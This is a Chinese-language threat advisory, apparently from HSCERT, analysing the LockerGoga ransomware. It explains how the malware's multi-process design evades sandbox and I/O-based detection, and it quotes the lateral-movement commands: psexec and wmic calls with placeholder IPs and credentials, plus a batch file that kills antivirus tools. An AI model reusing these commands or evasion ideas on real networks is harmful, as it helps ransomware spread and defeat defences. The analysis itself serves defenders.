事件来源

近日，HSCERT监测发现有APT组织在使用LockerGoga勒索软件对某些厂商进行定向攻击。

LockerGoga是一种勒索软件，这款病毒有一些有趣的行为，通过我们研究，并与其他家族进行比较，它具有一些独特的功能和行为，与其他活跃的勒索软件家族相比，有一些非常少见的功能。

为了发现它的功能，我们分析了我们找到的所有样本，发现了它们之间的相似之处，以及开发生命周期如何添加或修改代码中的不同功能。

勒索软件在终端上创建多个从属进程以加密文件。一些分析师认为这只是因为它加速了加密过程，但我们并不这样认为，因为通过勒索软件过程中的多线程方法而不是多进程方法可以实现相同的结果。

我们怀疑采用这种方法的原因如下：

l 痕迹：  如果每个加密过程仅加密终端上的少量文件并终止，那么攻击对系统的整体占用空间就会减少，因为可能很难将多个加密过程与同一个威胁联合起来。

l 沙箱绕过：一些基于沙箱的检测系统监视写入系统的文件数量的阈值，并可能将其与写入的文件扩展名相关联。例如，如果一个进程在沙盒上读取200个文件，但只创建具有一个特定扩展名的文件（典型的勒索软件 - 在LockerGoga的情况下为Extn“.locked”）则可以将此视为异常行为。LockerGoga可能能够绕过这种检测技术。

基于文件I / O的检测旁路：基于多进程的方法可确保每个加密过程的I / O量（文件/磁盘I / O等）都在一定限度内，从而绕过监控的检测技术基于I / O的检测。

l 可靠性：即使最终用户手动终止一个加密过程，只要主勒索软件进程正在运行，文件将继续由新的从属进程加密。如果勒索软件进程不使用多进程方法，则终止勒索软件进程会停止终端上的加密。

传播方式：

已知恶意软件通过远程文件复制在本地网络中传播。为此，使用简单副本将一组.batch文件复制到远程计算机TEMP文件夹：

l复制xax.bat \\ 123.123.123.123 \ c $ \ windows \ temp

恶意软件会将自身和工具PSEXEC.EXE复制到同一位置。复制完所有文件后，恶意软件将使用以下命令运行.BAT文件：

lStart psexec.exe \\ 123.123.123.123 -u domain \ user -p“pass”-d -h -r mstdc -s accepteula -nobanner c：\ windows \ temp \ xax.bat

这些.BAT文件中的每一个都包含在远程计算机上执行恶意软件的行。他们使用以下命令：

lstart wmic /node:"123.123.123.123“/ user：”domain \ user“/ password：”pass“进程调用create”cmd /cc:\windows\temp\kill.bat“

上面的批处理文件试图杀死多个AV产品并禁用安全工具。在脚本结束时，将执行远程计算机上的恶意软件副本

lC：\ WINDOWS \ TEMP \ taskhost.exe。

由于这些批处理文件的存在以及恶意软件二进制文件没有直接引用它们，我们认为传播机制是由攻击者或未知二进制文件手动执行的。路径，用户名和密码在脚本中是硬编码的，表明攻击者之前已了解环境。
